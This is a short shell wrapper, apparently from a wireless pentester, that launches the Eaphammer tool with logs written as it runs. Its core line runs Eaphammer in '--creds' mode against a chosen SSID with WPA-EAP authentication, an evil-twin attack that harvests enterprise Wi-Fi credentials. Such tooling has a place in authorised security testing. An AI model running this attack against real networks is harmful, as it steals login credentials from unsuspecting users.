#!/usr/bin/env sh
#
# Launcher/wrapper script around Eaphammer,
# it flushes logs immediately to disk
# (Eaphammer itself, as of version 1.13.5, saves logs only on exit, and not at all in case of an error)
#
# author: eda-abec
# 2022
#
# the logs are named by the SSID and placed in the Eaphammer directory
#
# usage:
# sudo eaph_flush.sh SSID interface
#   - SSID
#   - interface: the interface to run on, optional, defaults to wlan0


# change this accordingly
path="/root/eaphammer/"

ssid=$1
logfile=eaph_$ssid.log
echo "Writing to" $logfile

iface=$2
if [ -z $iface ]; then
    iface=wlan0
fi
echo "Running on interface" $iface


cd $path
sudo python eaphammer --creds -i $iface -e $ssid --auth wpa-eap | tee -a $logfile

